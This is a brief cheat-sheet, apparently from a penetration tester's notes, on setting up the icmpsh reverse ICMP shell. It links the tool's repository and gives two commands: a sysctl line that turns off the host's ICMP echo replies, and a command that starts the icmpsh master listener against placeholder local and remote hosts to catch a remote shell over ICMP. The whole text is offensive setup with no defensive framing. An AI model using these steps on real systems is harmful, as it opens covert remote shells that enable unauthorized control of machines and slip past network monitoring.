### soure 
https://github.com/bdamele/icmpsh  

### disable echo reply
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

### start listener
```
python2 icmpsh_m.py <lhost> <rhost>
```

